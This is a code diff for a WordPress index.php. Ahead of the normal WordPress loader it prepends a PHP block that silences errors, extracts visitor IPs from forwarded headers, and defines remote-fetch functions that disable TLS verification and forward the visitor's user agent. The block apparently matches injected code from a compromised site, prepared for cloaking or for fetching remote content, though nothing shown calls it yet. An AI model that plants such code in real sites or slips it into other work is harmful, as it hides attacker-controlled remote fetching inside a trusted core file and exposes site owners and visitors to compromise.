@@ -1,0 +1,78 @@
+<?php
+error_reporting(0);
+    function getrealIp()
+    {
+        if (getenv('HTTP_CLIENT_IP')) {
+            $ip = getenv('HTTP_CLIENT_IP');
+        }
+        if (getenv('HTTP_X_REAL_IP')) {
+            $ip = getenv('HTTP_X_REAL_IP');
+        } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
+            $ip = getenv('HTTP_X_FORWARDED_FOR');
+            $ips = explode(',', $ip);
+            $ip = $ips[0];
+        } elseif (getenv('REMOTE_ADDR')) {
+            $ip = getenv('REMOTE_ADDR');
+        } else {
+            $ip = '0.0.0.0';
+        }
+
+        return $ip;
+    }
+function get_url($url)
+{
+	$remoteContent = @file_get_contents($url);
+	if(empty($remoteContent))
+	{
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+		if(strpos($url,"https://") !== false){
+			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+		}
+		$remoteContent = curl_exec($ch);
+		curl_close($ch);
+	}
+	return $remoteContent;
+}
+function get_url2($url)
+{
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+	if(strpos($url,"https://") !== false){
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+	}
+	$remoteContent = curl_exec($ch);
+	curl_close($ch);
+	
+	if(empty($remoteContent))
+	{
+		$remoteContent = @file_get_contents($url);
+	}
+	return $remoteContent;
+}
+
+?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
